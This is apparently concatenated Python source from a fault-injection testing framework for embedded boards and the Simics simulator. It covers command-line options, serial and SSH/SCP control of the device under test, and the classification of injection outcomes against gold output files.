                    help='AUX scp port [default=22] (overridden by Simics)')
parser.add_argument('--aux_prompt', action='store', metavar='PROMPT',
                    dest='aux_prompt',
                    help='AUX console prompt [p2020 default=root@p2020rdb:~#] '
                         '[a9 default=[root@ZED]#] (overridden by Simics)')
parser.add_argument('--aux_uboot', action='store', metavar='COMMAND',
                    dest='aux_uboot', default='', help='AUX u-boot command')
parser.add_argument('--debugger_ip', action='store', metavar='ADDRESS',
                    dest='debugger_ip_address', default='10.42.0.50',
                    help='debugger ip address [default=10.42.0.50] '
                         '(ignored by Simics and ZedBoards)')
parser.add_argument('--no_jtag', action='store_false', dest='jtag',
                    help='do not connect to jtag debugger (ignored by Simics)')
subparsers = parser.add_subparsers(
    title='commands',
    description='Run "%(prog)s COMMAND -h" to get additional help for each '
                'command',
    metavar='COMMAND', dest='command')

new_campaign = subparsers.add_parser('new', aliases=['n'],
                                     help='create a new campaign',
                                     description='create a new campaign')
new_campaign.add_argument('application', action='store', metavar='APPLICATION',
                          help='application to run on device')
new_campaign.add_argument('-A', '--arch', action='store',
                          choices=('a9', 'p2020'), dest='architecture',                    
                          default='p2020',
                          help='target architecture [default=p2020]')
new_campaign.add_argument('-t', '--timing', action='store', type=int,
                          dest='iterations', default=5,
                          help='number of timing iterations to run [default=5]')
new_campaign.add_argument('-a', '--args', action='store', nargs='+',
                          dest='arguments', help='arguments for application')
new_campaign.add_argument('-d', '--dir', action='store', dest='directory',
                          default='fiapps',
                          help='directory to look for files [default=fiapps]')
new_campaign.add_argument('-f', '--files', action='store', nargs='+',
                          metavar='FILE', dest='files',
                          help='files to copy to device')
new_campaign.add_argument('-o', '--output', action='store', dest='file',
                          default='result.dat',
                          help='target application output file '
                               '[default=result.dat]')
new_campaign.add_argument('-x', '--aux', action='store_true', dest='use_aux',
                          help='use auxiliary device during testing')
new_campaign.add_argument('-y', '--aux_app', action='store',
                          metavar='APPLICATION', dest='aux_application',
                          help='target application for auxiliary device')
new_campaign.add_argument('-z', '--aux_args', action='store',
                          metavar='ARGUMENTS', dest='aux_arguments',
                          help='arguments for auxiliary application')
new_campaign.add_argument('-F', '--aux_files', action='store', nargs='+',
                          metavar='FILE', dest='aux_files',
                          help='files to copy to auxiliary device')
new_campaign.add_argument('-O', '--aux_output', action='store_true',
                          dest='use_aux_output',
                          help='use output file from auxiliary device')
new_campaign.add_argument('-k', '--kill_dut', action='store_true',
                          dest='kill_dut',
                          help='send ctrl-c to DUT after auxiliary device '
                               'completes execution')
new_campaign.add_argument('-s', '--simics', action='store_true',
                          dest='use_simics', help='use Simics simulator')
new_simics_campaign = new_campaign.add_argument_group(
    'Simics campaigns', 'Additional options for Simics campaigns only')
new_simics_campaign.add_argument('-c', '--checkpoints', action='store',
                                 type=int, metavar='CHECKPOINTS',
                                 dest='checkpoints', default=50,
                                 help='number of gold checkpoints to target for'
                                      ' creation (actual number of checkpoints '
                                      'may be different) [default=50]')
new_campaign.set_defaults(func=utilities.create_campaign)

inject = subparsers.add_parser('inject', aliases=['i', 'I', 'inj'],
                               help='perform fault injections on a campaign',
                               description='perform fault injections on a '
                                           'campaign')
inject.add_argument('-n', '--iterations', action='store', type=int,
                    dest='iterations',
                    help='number of iterations to perform [default=infinite]')
inject.add_argument('-i', '--injections', action='store', type=int,
                    dest='injections', default=1,
                    help='number of injections per iteration [default=1]')
inject.add_argument('-t', '--targets', action='store', nargs='+',
                    metavar='TARGET', dest='selected_targets',
                    help='list of targets for injection')
inject.add_argument('-p', '--processes', action='store', type=int,
                    dest='processes', default=1,
                    help='number of injections to perform in parallel '
                         '(only supported for ZedBoards and Simics)')
inject_simics = inject.add_argument_group(
    'Simics campaigns', 'Additional options for Simics campaigns only')
inject_simics.add_argument('-a', '--compare_all', action='store_true',
                           dest='compare_all',
                           help='monitor all checkpoints (only last by '
                                'default), IMPORTANT: do NOT use with '
                                '"-p" or "--processes" when using this '
                                'option for the first time in a '
                                'campaign')
inject.set_defaults(func=utilities.inject_campaign)

supervise = subparsers.add_parser('supervise', aliases=['s', 'S'],
                                  help='run interactive supervisor',
                                  description='run interactive supervisor')
supervise.add_argument('-w', '--wireshark', action='store_true', dest='capture',
                       help='run remote packet capture')
supervise.set_defaults(func=utilities.launch_supervisor)

log_viewer = subparsers.add_parser('log', aliases=['l'],
                                   help='start the log web server',
                                   description='start the log web server')
log_viewer.add_argument('-p', '--port', action='store', type=int,
                        dest='port', default=8000,
                        help='log web server port [default=8000]')
log_viewer.set_defaults(func=utilities.view_logs)

zedboards = subparsers.add_parser('zedboards', aliases=['z', 'Z'],
                                  help='print information about attached '
                                       'ZedBoards',
                                  description='print information about '
                                              'attached ZedBoards')
zedboards.set_defaults(func=utilities.print_zedboard_info)

list_campaigns = subparsers.add_parser('list', aliases=['L', 'ls'],
                                       help='list campaigns',
                                       description='list campaigns')
list_campaigns.set_defaults(func=utilities.list_campaigns)

delete = subparsers.add_parser('delete', aliases=['d', 'D'],
                               description='delete results and campaigns',
                               help='delete results and campaigns')
delete.add_argument('delete', action='store',
                    choices=('all', 'results', 'campaign'),                    
                    help='delete {results} for the selected campaign, '                    
                         'delete selected {campaign} and its results, '
                         'or delete {all} campaigns and results')
delete.set_defaults(func=utilities.delete)

merge = subparsers.add_parser('merge', aliases=['m', 'M'],
                              help='merge campaigns',
                              description='merge campaigns')
merge.add_argument('directory', action='store', metavar='DIRECTORY',
                   help='merge campaigns from external directory into the '
                        'local directory')
merge.set_defaults(func=utilities.merge_campaigns)

openocd = subparsers.add_parser('openocd', aliases=['o', 'O'],
                                help='launch openocd for DUT '
                                     '(only supported for ZedBoards)',
                                description='launch openocd for DUT '
                                            '(only supported for ZedBoards)')
openocd.set_defaults(func=utilities.launch_openocd)

regenerate = subparsers.add_parser('regenerate', aliases=['r', 'R'],
                                   help='regenerate injected state and launch '
                                        'in Simics (only supported for Simics '
                                        'campaigns)',
                                   description='regenerate injected state and '
                                               'launch in Simics (only '
                                               'supported for Simics '
                                               'campaigns)')
regenerate.add_argument('result_id', action='store', metavar='RESULT_ID',
                        help='result to regenerate')
regenerate.set_defaults(func=utilities.regenerate)

update = subparsers.add_parser('update', aliases=['u', 'U'],
                               help='update gold checkpoint dependency paths '
                                    '(only supported for Simics campaigns)',
                               description='update gold checkpoint dependency '
                                           'paths (only supported for Simics '
                                           'campaigns)')
update.set_defaults(func=utilities.update_dependencies)

backup = subparsers.add_parser('backup', aliases=['b', 'B'],
                               help='backup the results database',
                               description='backup the results database')
backup.set_defaults(func=utilities.backup_database)

options = parser.parse_args()
if options.command is None:
    parser.print_help()
else:
    if options.command != 'new':
        if not options.campaign_id:
            options.campaign_id = utilities.get_last_campaign()
        if options.campaign_id:
            options.architecture = \
                utilities.get_campaign_data(options.campaign_id)['architecture']
    if options.command == 'new' or options.campaign_id:
        if options.architecture == 'p2020':
            if options.dut_serial_port is None:
                options.dut_serial_port = '/dev/ttyUSB1'
            if options.dut_prompt is None:
                options.dut_prompt = 'root@p2020rdb:~#'
            if options.aux_serial_port is None:
                options.aux_serial_port = '/dev/ttyUSB0'
            if options.aux_prompt is None:
                options.aux_prompt = 'root@p2020rdb:~#'
        elif options.architecture == 'a9':
            if options.dut_serial_port is None:
                options.dut_serial_port = '/dev/ttyACM0'
            if options.dut_prompt is None:
                options.dut_prompt = '[root@ZED]#'
            if options.aux_serial_port is None:
                options.aux_serial_port = '/dev/ttyACM1'
            if options.aux_prompt is None:
                options.aux_prompt = '[root@ZED]#'
    if options.command == 'new' and options.arguments:
        options.arguments = ' '.join(options.arguments)
    options.func(options)

from paramiko import AutoAddPolicy, SSHClient
from scp import SCPClient
from serial import Serial
import sys
from termcolor import colored
from time import sleep

from error import DrSEUsError
from sql import sql


class dut(object):
    error_messages = [
        ('drseus_sighandler: SIGSEGV', 'Signal SIGSEGV'),
        ('drseus_sighandler: SIGILL', 'Signal SIGILL'),
        ('drseus_sighandler: SIGBUS', 'Signal SIGBUS'),
        ('drseus_sighandler: SIGFPE', 'Signal SIGFPE'),
        ('drseus_sighandler: SIGABRT', 'Signal SIGABRT'),
        ('drseus_sighandler: SIGIOT', 'Signal SIGIOT'),
        ('drseus_sighandler: SIGTRAP', 'Signal SIGTRAP'),
        ('drseus_sighandler: SIGSYS', 'Signal SIGSYS'),
        ('drseus_sighandler: SIGEMT', 'Signal SIGEMT'),
        ('command not found', 'Invalid command'),
        ('No such file or directory', 'Missing file'),
        ('panic', 'Kernel error'),
        ('Oops', 'Kernel error'),
        ('Segmentation fault', 'Segmentation fault'),
        ('Illegal instruction', 'Illegal instruction'),
        ('Call Trace:', 'Kernel error'),
        ('detected stalls on CPU', 'Stall detected'),
        ('malloc(), memory corruption', 'Kernel error'),
        ('Bad swap file entry', 'Kernel error'),
        ('Unable to handle kernel paging request', 'Kernel error'),
        ('Alignment trap', 'Kernel error'),
        ('Unhandled fault', 'Kernel error'),
        ('free(), invalid next size', 'Kernel error'),
        ('double free or corruption', 'Kernel error'),
        ('????????', '????????'),
        ('Hit any key to stop autoboot:', 'Reboot'),
        ('can\'t get kernel image', 'Error booting')]

    def __init__(self, campaign_data, result_data, options, rsakey, aux=False):
        self.campaign_data = campaign_data
        self.result_data = result_data
        self.options = options
        self.aux = aux
        self.uboot_command = self.options.dut_uboot if not self.aux \
            else self.options.aux_uboot
        serial_port = (options.dut_serial_port if not aux
                       else options.aux_serial_port)
        baud_rate = (options.dut_baud_rate if not aux
                     else options.aux_baud_rate)
        self.serial = Serial(port=None, baudrate=baud_rate,
                             timeout=options.timeout, rtscts=True)
        if self.campaign_data['use_simics']:
            # workaround for pyserial 3
            self.serial._dsrdtr = True
        self.serial.port = serial_port
        self.serial.open()
        self.serial.reset_input_buffer()
        self.prompt = options.dut_prompt if not aux else options.aux_prompt
        self.prompt += ' '
        self.rsakey = rsakey

    def __str__(self):
        string = ('Serial Port: '+self.serial.port+'\n\tTimeout: ' +
                  str(self.serial.timeout)+' seconds\n\tPrompt: \"' +
                  self.prompt+'\"')
        try:
            string += '\n\tIP Address: '+self.ip_address
        except AttributeError:
            pass
        string += '\n\tSCP Port: '+str(self.options.dut_scp_port if not self.aux
                                       else self.options.aux_scp_port)
        return string

    def close(self):
        self.serial.close()

    def send_files(self, files, attempts=10):
        if self.options.debug:
            print(colored('sending file(s)...', 'blue'), end='')
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        for attempt in range(attempts):
            try:
                ssh.connect(self.ip_address, port=(self.options.dut_scp_port
                                                   if not self.aux else
                                                   self.options.aux_scp_port),
                            username='root', pkey=self.rsakey,
                            allow_agent=False, look_for_keys=False)
            except Exception as error:
                if self.options.command != 'new':
                    with sql() as db:
                        db.log_event_exception(                                        
                            self.result_data['id'],
                            ('DUT' if not self.aux else 'AUX'),                    
                            'SSH error')                    
                print(colored(
                    self.serial.port+' '+str(self.result_data['id'])+': '                                        
                    'error sending file(s) (attempt '+str(attempt+1)+'/' +
                    str(attempts)+'): '+str(error), 'red'))
                if attempt < attempts-1:
                    sleep(30)
                else:
                    raise DrSEUsError(DrSEUsError.ssh_error)
            else:
                dut_scp = SCPClient(ssh.get_transport())
                try:
                    dut_scp.put(files)
                except Exception as error:
                    if self.options.command != 'new':
                        with sql() as db:
                            db.log_event_exception(                                        
                                self.result_data['id'],
                                ('DUT' if not self.aux else 'AUX'),                    
                                'SCP error')                    
                    print(colored(
                        self.serial.port+' '+str(self.result_data['id'])+': '                                        
                        'error sending file(s) (attempt '+str(attempt+1)+'/' +
                        str(attempts)+'): '+str(error), 'red'))
                    dut_scp.close()
                    ssh.close()
                    if attempt < attempts-1:
                        sleep(30)
                    else:
                        raise DrSEUsError(DrSEUsError.scp_error)
                else:
                    dut_scp.close()
                    ssh.close()
                    if self.options.debug:
                        print(colored('done', 'blue'))
                    break

    def get_file(self, file_, local_path='', attempts=10):
        if self.options.debug:
            print(colored('getting file...', 'blue'), end='')
            sys.stdout.flush()
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        for attempt in range(attempts):
            try:
                ssh.connect(self.ip_address, port=(self.options.dut_scp_port
                                                   if not self.aux else
                                                   self.options.aux_scp_port),
                            username='root', pkey=self.rsakey,
                            allow_agent=False, look_for_keys=False)
            except Exception as error:
                if self.options.command != 'new':
                    with sql() as db:
                        db.log_event_exception(                                        
                            self.result_data['id'],
                            ('DUT' if not self.aux else 'AUX'),                    
                            'SSH error')                    
                print(colored(
                    self.serial.port+' '+str(self.result_data['id'])+': '                                        
                    'error receiving file (attempt '+str(attempt+1)+'/' +
                    str(attempts)+'): '+str(error), 'red'))
                if attempt < attempts-1:
                    sleep(30)
                else:
                    raise DrSEUsError(DrSEUsError.ssh_error)
            else:
                dut_scp = SCPClient(ssh.get_transport())
                try:
                    dut_scp.get(file_, local_path=local_path)
                except:                    
                    if self.options.command != 'new':
                        with sql() as db:
                            db.log_event_exception(                                        
                                self.result_data['id'],
                                ('DUT' if not self.aux else 'AUX'),                    
                                'SCP error')                    
                    print(colored(
                        self.serial.port+' '+str(self.result_data['id'])+': '                                        
                        'error receiving file (attempt '+str(attempt+1)+'/' +
                        str(attempts)+'): '+str(error), 'red'))
                    dut_scp.close()
                    ssh.close()
                    if attempt < attempts-1:
                        sleep(30)
                    else:
                        raise DrSEUsError(DrSEUsError.scp_error)
                else:
                    dut_scp.close()
                    ssh.close()
                    if self.options.debug:
                        print(colored('done', 'blue'))
                    break

    def write(self, string):
        self.serial.write(bytes(string, encoding='utf-8'))

    def read_until(self, string=None, continuous=False, boot=False):
        if string is None:
            string = self.prompt
        buff = ''
        event_buff = ''
        event_buff_logged = ''
        errors = 0
        while True:
            char = self.serial.read().decode('utf-8', 'replace')
            if not char:
                if self.options.command != 'new':
                    with sql() as db:
                        event_buff = buff.replace(event_buff_logged, '')                    
                        db.log_event(self.result_data['id'],                    
                                     ('DUT' if not self.aux else 'AUX'),                    
                                     'Read timeout', event_buff)                    
                        event_buff_logged += event_buff                    
                if not continuous:
                    break
            if self.options.command == 'new':
                self.campaign_data['dut_output' if not self.aux
                                   else 'aux_output'] += char
            else:
                self.result_data['dut_output' if not self.aux
                                 else 'aux_output'] += char
            if self.options.debug:
                print(colored(char, 'green' if not self.aux else 'cyan'),
                      end='')
                sys.stdout.flush()
            buff += char
            if not continuous and buff[-len(string):] == string:
                break
            elif buff[-len('autoboot: '):] == 'autoboot: ' and \
                    self.uboot_command:
                self.write('\n')
                self.write(self.uboot_command+'\n')
            elif buff[-len('login: '):] == 'login: ':
                self.write(self.options.username+'\n')
            elif buff[-len('Password: '):] == 'Password: ':
                self.write(self.options.password+'\n')
            elif buff[-len('can\'t get kernel image'):] == \
                    'can\'t get kernel image':
                self.write('reset\n')
                errors += 1
            for message, category in self.error_messages:
                if buff[-len(message):] == message:
                    if not continuous and not boot:
                        self.serial.timeout = 30
                        errors += 1
                    if self.options.command != 'new' and not (boot):
                            # boot and category == 'Reboot'):
                        with sql() as db:
                            event_buff = buff.replace(event_buff_logged, '')                    
                            db.log_event(self.result_data['id'],                    
                                         ('DUT' if not self.aux else 'AUX'),                    
                                         category, event_buff)
                            event_buff_logged += event_buff                    
            if not continuous and errors > 10:
                break
            if not boot and buff and buff[-1] == '\n':
                with sql() as db:
                    if self.options.command == 'new':
                        db.update_dict('campaign', self.campaign_data)
                    else:
                        db.update_dict('result', self.result_data)
        if self.serial.timeout != self.options.timeout:
            self.serial.timeout = self.options.timeout
        if self.options.debug:
            print()
        with sql() as db:
            if self.options.command == 'new':
                db.update_dict('campaign', self.campaign_data)
            else:
                db.update_dict('result', self.result_data)
        if errors and not boot:
            for message, category in self.error_messages:
                if message in buff:
                    raise DrSEUsError(category)
        return buff

    def command(self, command=''):
        self.write(command+'\n')
        return self.read_until()

    def do_login(self, ip_address=None, change_prompt=False, simics=False):
        # try:
        self.write('\n')
        self.read_until(boot=True)
        # except DrSEUsError as error:
        #     if error.type == 'Reboot':
        #         pass
        #     else:
        #         raise DrSEUsError(error.type)
        if change_prompt:
            self.write('export PS1=\"DrSEUs# \"\n')
            self.read_until('export PS1=\"DrSEUs# \"')
            self.prompt = 'DrSEUs# '
            self.read_until()
        self.command('mkdir ~/.ssh')
        self.command('touch ~/.ssh/authorized_keys')
        self.command('echo \"ssh-rsa '+self.rsakey.get_base64() +
                     '\" > ~/.ssh/authorized_keys')
        if ip_address is None:
            attempts = 10
            for attempt in range(attempts):
                for line in self.command('ip addr show').split('\n'):
                    line = line.strip().split()
                    if len(line) > 0 and line[0] == 'inet':
                        addr = line[1].split('/')[0]
                        if addr != '127.0.0.1':
                            ip_address = addr
                            break
                else:
                    if attempt < attempts-1:
                        sleep(5)
                    else:
                        raise DrSEUsError('Error finding device ip address')
                if ip_address is not None:
                    break
        else:
            self.command('ip addr add '+ip_address+'/24 dev eth0')
            self.command('ip link set eth0 up')
            self.command('ip addr show')
        if simics:
            self.ip_address = '127.0.0.1'
        else:
            self.ip_address = ip_address

from difflib import SequenceMatcher
import os
from paramiko import RSAKey
from shutil import copy, rmtree
from subprocess import PIPE, Popen
from termcolor import colored
from threading import Thread
from time import sleep

from error import DrSEUsError
from jtag import bdi_p2020, openocd
from simics import simics
from sql import sql


class fault_injector(object):
    def __init__(self, campaign_data, options):
        self.campaign_data = campaign_data
        self.options = options
        self.result_data = {'campaign_id': self.campaign_data['id'],
                            'aux_output': '',
                            'data_diff': None,
                            'debugger_output': '',
                            'detected_errors': None,
                            'dut_output': ''}
        if os.path.exists(
                'campaign-data/'+str(campaign_data['id'])+'/private.key'):
            self.rsakey = RSAKey.from_private_key_file(
                'campaign-data/'+str(campaign_data['id'])+'/private.key')
        else:
            self.rsakey = RSAKey.generate(1024)
            self.rsakey.write_private_key_file(
                'campaign-data/'+str(campaign_data['id'])+'/private.key')
        if self.campaign_data['use_simics']:
            self.debugger = simics(campaign_data, self.result_data, options,
                                   self.rsakey)
        else:
            if campaign_data['architecture'] == 'p2020':
                self.debugger = bdi_p2020(campaign_data, self.result_data,
                                          options, self.rsakey)
            elif campaign_data['architecture'] == 'a9':
                self.debugger = openocd(campaign_data, self.result_data,
                                        options, self.rsakey)
        if not self.campaign_data['use_simics']:
            if self.campaign_data['use_aux']:
                self.debugger.aux.serial.write('\x03')
                self.debugger.aux.do_login()
                if options.command != 'new':
                    self.send_dut_files(aux=True)
            if options.command == 'new':
                self.debugger.reset_dut()

    def __str__(self):
        string = ('DrSEUs Attributes:\n\tDebugger: '+str(self.debugger) +
                  '\n\tDUT:\t'+str(self.debugger.dut).replace('\n\t', '\n\t\t'))
        if self.campaign_data['use_aux']:
            string += '\n\tAUX:\t'+str(self.debugger.aux).replace('\n\t',
                                                                  '\n\t\t')
        string += ('\n\tCampaign Information:\n\t\tCampaign Number: ' +
                   str(self.campaign_data['id'])+'\n\t\tDUT Command: \"' +
                   self.campaign_data['command']+'\"')
        if self.campaign_data['use_aux']:
            string += ('\n\t\tAUX Command: \"' +
                       self.campaign_data['aux_command']+'\"')
        string += ('\n\t\t' +
                   ('Host 'if self.campaign_data['use_simics'] else '') +
                   'Execution Time: ' +
                   str(self.campaign_data['exec_time'])+' seconds')
        if self.campaign_data['use_simics']:
            string += ('\n\t\tExecution Cycles: ' +
                       '{:,}'.format(self.campaign_data['num_cycles']) +
                       ' cycles\n\t\tSimulated Time: ' +
                       str(self.campaign_data['sim_time'])+' seconds')
        return string

    def close(self):
        if not self.campaign_data['use_simics']:
            self.debugger.close()

    def setup_campaign(self):
        files = []
        files.append(self.options.directory+'/'+self.options.application)
        if self.options.files:
            for file_ in self.options.files:
                files.append(self.options.directory+'/'+file_)
        os.makedirs('campaign-data/'+str(self.campaign_data['id'])+'/dut-files')
        for item in files:
            copy(item, 'campaign-data/'+str(self.campaign_data['id']) +
                       '/dut-files/')
        if self.campaign_data['use_aux']:
            aux_files = []
            aux_files.append(self.options.directory+'/' +
                             self.options.aux_application)
            if self.options.aux_files:
                for file_ in self.options.aux_files:
                    aux_files.append(
                        self.options.directory+'/'+file_)
            os.makedirs('campaign-data/'+str(self.campaign_data['id']) +
                        '/aux-files')
            for item in aux_files:
                copy(item, 'campaign-data/'+str(self.campaign_data['id']) +
                           '/aux-files/')
            aux_process = Thread(target=self.debugger.aux.send_files,
                                 args=(aux_files, ))
            aux_process.start()
        self.debugger.dut.send_files(files)
        if self.campaign_data['use_aux']:
            aux_process.join()
            aux_process = Thread(target=self.debugger.aux.command)
            aux_process.start()
        self.debugger.dut.command()
        if self.campaign_data['use_aux']:
            aux_process.join()
        self.debugger.time_application()
        if self.campaign_data['output_file']:
            if self.campaign_data['use_aux_output']:
                self.debugger.aux.get_file(
                    self.campaign_data['output_file'],
                    'campaign-data/'+str(self.campaign_data['id'])+'/gold_' +
                    self.campaign_data['output_file'])
            else:
                self.debugger.dut.get_file(
                    self.campaign_data['output_file'],
                    'campaign-data/'+str(self.campaign_data['id'])+'/gold_' +
                    self.campaign_data['output_file'])
        if self.campaign_data['use_simics']:
            self.debugger.close()
        with sql() as db:
            db.update_dict('campaign', self.campaign_data)
        self.close()

    def send_dut_files(self, aux=False):
        location = 'campaign-data/'+str(self.campaign_data['id'])
        if aux:
            location += '/aux-files/'
        else:
            location += '/dut-files/'
        files = []
        for item in os.listdir(location):
            files.append(location+item)
        if aux:
            self.debugger.aux.send_files(files)
        else:
            self.debugger.dut.send_files(files)

    def create_result(self, num_injections=0, outcome_category='Incomplete',
                      outcome='Incomplete'):
        self.result_data.update({'aux_output': '',
                                 'data_diff': None,
                                 'debugger_output': '',
                                 'detected_errors': None,
                                 'dut_output': '',
                                 'num_injections': num_injections,
                                 'outcome_category': outcome_category,
                                 'outcome': outcome,
                                 'timestamp': None})
        if 'id' in self.result_data:
            del self.result_data['id']
        with sql() as db:
            db.insert_dict('result', self.result_data)
            self.result_data['id'] = db.cursor.lastrowid
            db.insert_dict('injection', {'result_id': self.result_data['id'],
                                         'injection_number': 0})

    def __monitor_execution(self, latent_faults=0, persistent_faults=False):

        def check_output():
            missing_output = False
            result_folder = ('campaign-data/'+str(self.campaign_data['id'])+'/'
                             'results/'+str(self.result_data['id']))
            os.makedirs(result_folder)
            output_location = \
                result_folder+'/'+self.campaign_data['output_file']
            gold_location = ('campaign-data/'+str(self.campaign_data['id'])+'/'
                             'gold_'+self.campaign_data['output_file'])
            if self.campaign_data['use_aux_output']:
                self.debugger.aux.get_file(self.campaign_data['output_file'],
                                           output_location)
            else:
                self.debugger.dut.get_file(self.campaign_data['output_file'],
                                           output_location)
            if not os.listdir(result_folder):
                os.rmdir(result_folder)
                missing_output = True
            else:
                with open(gold_location, 'rb') as solution:
                    solutionContents = solution.read()
                with open(output_location, 'rb') as result:
                    resultContents = result.read()
                self.result_data['data_diff'] = SequenceMatcher(
                    None, solutionContents, resultContents).quick_ratio()
                if self.result_data['data_diff'] == 1.0:
                    os.remove(output_location)
                    if not os.listdir(result_folder):
                        os.rmdir(result_folder)
            if self.campaign_data['use_aux_output']:
                self.debugger.aux.command('rm ' +
                                          self.campaign_data['output_file'])
            else:
                self.debugger.dut.command('rm ' +
                                          self.campaign_data['output_file'])
            if missing_output:
                raise DrSEUsError(DrSEUsError.missing_output)

    # def __monitor_execution(self, latent_faults=0, persistent_faults=False):
        outcome = ''
        outcome_category = ''
        if self.campaign_data['use_aux']:
            try:                    
                aux_buff = self.debugger.aux.read_until()
            except DrSEUsError as error:
                aux_buff = ''
                self.debugger.dut.serial.write('\x03')
                outcome = error.type
                outcome_category = 'AUX execution error'
            else:
                if self.campaign_data['kill_dut']:
                    self.debugger.dut.serial.write('\x03')
        try:                    
            buff = self.debugger.dut.read_until()
        except DrSEUsError as error:
            buff = ''
            outcome = error.type
            outcome_category = 'Execution error'
        for line in buff.split('\n'):
            if 'drseus_detected_errors:' in line:
                self.result_data['detected_errors'] = \
                    int(line.replace('drseus_detected_errors:', ''))
                break
        if self.campaign_data['use_aux']:
            for line in aux_buff.split('\n'):
                if 'drseus_detected_errors:' in line:
                    if self.result_data['detected_errors'] is None:
                        self.result_data['detected_errors'] = 0
                    self.result_data['detected_errors'] += \
                        int(line.replace('drseus_detected_errors:', ''))
                    break
        if self.campaign_data['output_file'] and not outcome:
            try:                    
                check_output()
            except DrSEUsError as error:
                if error.type == DrSEUsError.scp_error:
                    outcome = 'Error getting output file'
                    outcome_category = 'SCP error'
                elif error.type == DrSEUsError.missing_output:
                    outcome = 'Missing output file'
                    outcome_category = 'SCP error'
                else:
                    outcome = error.type
                    outcome_category = 'Post execution error'
        if not outcome:
            if self.result_data['detected_errors']:
                if self.result_data['data_diff'] is None or \
                        self.result_data['data_diff'] < 1.0:
                    outcome = 'Detected data error'
                    outcome_category = 'Data error'
                elif self.result_data['data_diff'] is not None and \
                        self.result_data['data_diff'] == 1:
                    outcome = 'Corrected data error'
                    outcome_category = 'Data error'
            elif self.result_data['data_diff'] is not None and \
                    self.result_data['data_diff'] < 1.0:
                outcome = 'Silent data error'
                outcome_category = 'Data error'
            elif persistent_faults:
                outcome = 'Persistent faults'
                outcome_category = 'No error'
            elif latent_faults:
                outcome = 'Latent faults'
                outcome_category = 'No error'
            else:
                outcome = 'Masked faults'
                outcome_category = 'No error'
        return outcome, outcome_category

    def log_result(self):
        out = ''                    
        try:                    
            out += self.debugger.dut.serial.port+' '                    
        except AttributeError:                    
            pass                    
        out += (str(self.result_data['id'])+': ' +                    
                self.result_data['outcome_category']+' - ' +                    
                self.result_data['outcome'])                    
        if self.result_data['data_diff'] is not None and \
                self.result_data['data_diff'] < 1.0:
            out += ' {0:.2f}%'.format(max(self.result_data['data_diff']*100,
                                          99.99))
        print(colored(out, 'blue'))
        with sql() as db:
            db.cursor.execute('SELECT COUNT(*) FROM log_injection '
                              'WHERE result_id=?', (self.result_data['id'],))
            if db.cursor.fetchone()[0] > 1:
                db.cursor.execute('DELETE FROM log_injection WHERE '
                                  'result_id=? AND injection_number=0',
                                  (self.result_data['id'],))
            db.update_dict('result', self.result_data)

    def inject_and_monitor(self, iteration_counter):
        while True:
            if iteration_counter is not None:
                with iteration_counter.get_lock():
                    iteration = iteration_counter.value
                    if iteration:
                        iteration_counter.value -= 1
                    else:
                        break
            self.create_result(self.options.injections)
            if not self.campaign_data['use_simics']:
                attempts = 10
                for attempt in range(attempts):
                    try:                    
                        self.debugger.reset_dut()
                    except Exception as error:
                        with sql() as db:
                            db.log_event_exception(                    
                                self.result_data['id'],
                                'Debugger',  # TODO: update source
                                'Error resetting DUT')                    
                        print(colored(
                            self.debugger.dut.serial.port+' ' +                    
                            str(self.result_data['id'])+': '
                            'Error resetting DUT (attempt '+str(attempt+1) +
                            '/'+str(attempts)+'): '+str(error), 'red'))
                        if attempt < attempts-1:
                            sleep(30)
                        else:
                            self.result_data.update({
                                'outcome_category': 'Debugger error',
                                'outcome': 'Error resetting dut'})
                            self.log_result()
                            self.close()
                            return
                    else:
                        break
                try:                    
                    self.send_dut_files()
                except DrSEUsError as error:
                    self.result_data.update({
                        'outcome_category': error.type,
                        'outcome': 'Error sending files to DUT'})
                    self.log_result()
                    continue
            if self.campaign_data['use_aux'] and \
                    not self.campaign_data['use_simics']:
                self.debugger.aux.write('./'+self.campaign_data['aux_command'] +
                                        '\n')
            try:                    
                latent_faults, persistent_faults = self.debugger.inject_faults()
                self.debugger.continue_dut()
            except DrSEUsError as error:
                self.result_data['outcome'] = error.type
                if self.campaign_data['use_simics']:
                    self.result_data['outcome_category'] = 'Simics error'
                else:
                    self.result_data['outcome_category'] = 'Debugger error'
                    if not self.campaign_data['use_simics']:
                        try:                    
                            self.debugger.continue_dut()
                            if self.campaign_data['use_aux']:
                                aux_process = Thread(
                                    target=self.debugger.aux.read_until)
                                aux_process.start()
                            self.debugger.dut.read_until()
                            if self.campaign_data['use_aux']:
                                aux_process.join()
                        except DrSEUsError:
                            pass                    
            else:
                (self.result_data['outcome'],
                 self.result_data['outcome_category']) = \
                    self.__monitor_execution(latent_faults, persistent_faults)
                if self.result_data['outcome'] == 'Latent faults' or \
                    (not self.campaign_data['use_simics'] and
                        self.result_data['outcome'] == 'Masked faults'):
                    if self.campaign_data['use_aux']:
                        self.debugger.aux.write(
                            './'+self.campaign_data['aux_command']+'\n')
                    self.debugger.dut.write('./'+self.campaign_data['command'] +
                                            '\n')
                    next_outcome = self.__monitor_execution()[0]
                    if next_outcome != 'Masked faults':
                        self.result_data.update({
                            'outcome_category': 'Post execution error',
                            'outcome': next_outcome})
            if self.campaign_data['use_simics']:
                try:                    
                    self.debugger.close()
                except DrSEUsError as error:
                    self.result_data.update({
                        'outcome_category': 'Simics error',
                        'outcome': error.type})
                finally:
                    rmtree('simics-workspace/injected-checkpoints/' +
                           str(self.campaign_data['id'])+'/' +
                           str(self.result_data['id']))
            self.log_result()
        self.close()

    def supervise(self, iteration_counter, packet_capture):
        interrupted = False
        while not interrupted:
            with iteration_counter.get_lock():
                iteration = iteration_counter.value
                if iteration:
                    iteration_counter.value -= 1
                else:
                    break
            self.create_result()
            if packet_capture:
                data_dir = ('campaign-data/'+str(self.campaign_data['id']) +
                            '/results/'+str(self.result_data['id']))
                os.makedirs(data_dir)
                capture_file = open(data_dir+'/capture.pcap', 'w')
                capture_process = Popen(
                    ['ssh', 'p2020', 'tshark -F pcap -i eth1 -w -'],
                    stderr=PIPE, stdout=capture_file)
                buff = ''
                while True:
                    buff += capture_process.stderr.read(1)
                    if buff[-len('Capturing on \'eth1\''):] == \
                            'Capturing on \'eth1\'':
                        break
            if self.campaign_data['use_aux']:
                self.debugger.aux.write('./'+self.campaign_data['aux_command'] +
                                        '\n')
            self.debugger.dut.write('./'+self.campaign_data['command']+'\n')
            try:                    
                (self.result_data['outcome'],
                 self.result_data['outcome_category']) = \
                    self.__monitor_execution()
